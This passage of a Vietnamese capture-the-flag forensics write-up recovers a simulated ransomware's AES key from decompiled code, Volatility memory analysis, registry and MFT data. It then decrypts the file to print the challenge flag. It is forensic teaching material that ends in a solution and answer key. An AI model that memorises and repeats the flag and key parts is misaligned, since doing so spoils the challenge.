      if ( aes256_encrypt_simple((int)v16, v12, Src, v9, (int)&v8, (int)&ElementCount) )
      {
        puts("Encryption failed");
        return 1;
      }
      else
      {
        if ( Str[strlen(Str) - 1] == 92 || Str[strlen(Str) - 1] == 47 )
          snprintf(FileName, 0x104u, "%sto_encrypt.txt.enc", Str);
        else
          snprintf(FileName, 0x104u, "%s\\to_encrypt.txt.enc", Str);
        Stream = fopen(FileName, "wb");
        if ( Stream )
        {
          fwrite(v8, 1u, ElementCount, Stream);
          fclose(Stream);
          if ( Block )
            free(Block);
          if ( Src )
            free(Src);
          if ( v8 )
            free(v8);
          free(pbData);
          return 0;
        }
        else
        {
          return 1;
        }
      }
    }
  }
}
```
Sau khi phân tích code, ta sẽ thấy được file mã hóa bằng aes cbc với cấu tạo của iv và key như sau: 
```
key = sha256(argv[1]|computername|secret_part.txt`)
iv = key[:16]
```
![image](https://hackmd.io/_uploads/BJFFAVfael.png)

![image](https://hackmd.io/_uploads/HyXdRNfTll.png)


![image](https://hackmd.io/_uploads/Bk6qAEMpxl.png)

![image](https://hackmd.io/_uploads/HJAoC4Mpxl.png)

![image](https://hackmd.io/_uploads/SkSBbHMalx.png)

Vậy giờ chúng ta cần tìm các parts của key.
Tìm `argv[1]` bằng cách dùng plugin `consoles` của vol2 với file `mem.vmem`, ở bài này file `.vmem` sử dụng `winxp`
![image](https://hackmd.io/_uploads/BJwb4SGaxe.png)
```
vol2 -f mem.vmem --profile=WinXPSP3x86 consoles
Volatility Foundation Volatility Framework 2.6
**************************************************
ConsoleProcess: csrss.exe Pid: 600
Console: 0x4f23b0 CommandHistorySize: 50
HistoryBufferCount: 1 HistoryBufferMax: 4
OriginalTitle: %SystemRoot%\system32\cmd.exe
Title: C:\WINDOWS\system32\cmd.exe
AttachedProcess: cmd.exe Pid: 2284 Handle: 0x458
----
CommandHistory: 0x10386f8 Application: cmd.exe Flags: Allocated, Reset
CommandCount: 2 LastAdded: 1 LastDisplayed: 1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x458
Cmd #0 at 0x1044400: cd Desktop
Cmd #1 at 0x4f1f90: cls
----
Screen 0x4f2ab0 X:80 Y:300
Dump:

C:\Documents and Settings\RagdollFan2005\Desktop>locker_sim.exe hmmisitreallyts
**************************************************
ConsoleProcess: csrss.exe Pid: 600
Console: 0x1044560 CommandHistorySize: 50
HistoryBufferCount: 2 HistoryBufferMax: 4
OriginalTitle: ?OystemRoot%\system32\cmd.exe
Title:
```
Tiếp theo chúng ta sẽ tìm computer name trong `system` registry.
Đầu tiên scan offset của `system`
```
vol2 -f mem.vmem --profile=WinXPSP3x86 hivelist
Volatility Foundation Volatility Framework 2.6
Virtual    Physical   Name
---------- ---------- ----
0xe1c626a8 0x0d3776a8 \Device\HarddiskVolume1\Documents and Settings\RagdollFan2005\Local Settings\Application Data\Microsoft\Windows\UsrClass.dat
0xe26d3008 0x0e5e3008 \Device\HarddiskVolume1\Documents and Settings\RagdollFan2005\NTUSER.DAT
0xe1c1a008 0x0ce21008 \Device\HarddiskVolume1\Documents and Settings\LocalService\Local Settings\Application Data\Microsoft\Windows\UsrClass.dat
0xe1c0cb60 0x0cbdbb60 \Device\HarddiskVolume1\Documents and Settings\LocalService\NTUSER.DAT
0xe19d7008 0x0ca05008 \Device\HarddiskVolume1\Documents and Settings\NetworkService\Local Settings\Application Data\Microsoft\Windows\UsrClass.dat
0xe19e5008 0x0c924008 \Device\HarddiskVolume1\Documents and Settings\NetworkService\NTUSER.DAT
0xe184e700 0x09661700 \Device\HarddiskVolume1\WINDOWS\system32\config\software
0xe1852678 0x096f7678 \Device\HarddiskVolume1\WINDOWS\system32\config\default
0xe1673b60 0x04402b60 \Device\HarddiskVolume1\WINDOWS\system32\config\SAM
0xe153fb60 0x03ddeb60 \Device\HarddiskVolume1\WINDOWS\system32\config\SECURITY
0xe13d2b60 0x02e5bb60 [no name]
0xe1035b60 0x02abbb60 \Device\HarddiskVolume1\WINDOWS\system32\config\system
0xe102e008 0x02ab5008 [no name]
```
Chúng ta có offset của `system` là `0xe1035b60`, sau đó chúng ta tìm computer name với plugin `printkey`.
```
vol2 -f mem.vmem --profile=WinXPSP3x86 printkey -o 0xe1035b60 -K "ControlSet001\\
Control\\ComputerName\\ComputerName"
Volatility Foundation Volatility Framework 2.6
Legend: (S) = Stable   (V) = Volatile

----------------------------
Registry: \Device\HarddiskVolume1\WINDOWS\system32\config\system
Key name: ComputerName (S)
Last updated: 2019-10-01 06:35:33 UTC+0000

Subkeys:

Values:
REG_SZ        ComputerName    : (S) RAGDOLLF-F9AC5A
```
Cuối cùng, chúng ta có thể tìm được content của `secret_part.txt` bằng cách tìm trong MFT trong `disk.ad1`
![image](https://hackmd.io/_uploads/r1Ay5HMpxe.png)
```
argv[1] = hmmisitreallyts
computer_name = RAGDOLLF-F9AC5A
secret_part = sigmadroid
```
Chạy code decrypt sau sẽ có được mã base64x3 của flag
```
from hashlib import sha256

computer_name = "RAGDOLLF-F9AC5A"
secret_part = "sigmadroid"
arg1 = 'hmmisitreallyts'
pbfile = f'{arg1}|{computer_name}|{secret_part}'
key = sha256(pbfile.encode()).hexdigest()
iv = key[:32]

def aes_decrypt(ciphertext: bytes) -> bytes:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import unpad
    from base64 import b64decode

    cipher = AES.new(bytes.fromhex(key), AES.MODE_CBC, iv=bytes.fromhex(iv))
    decrypted = unpad(cipher.decrypt(ciphertext), AES.block_size)
    return decrypted

f = open('to_encrypt.txt.enc', 'rb')
ciphertext = f.read()
f.close()

decrypted = aes_decrypt(ciphertext)
print(decrypted)
```

#### Flag: `Securinets{screen+registry+mft??}`








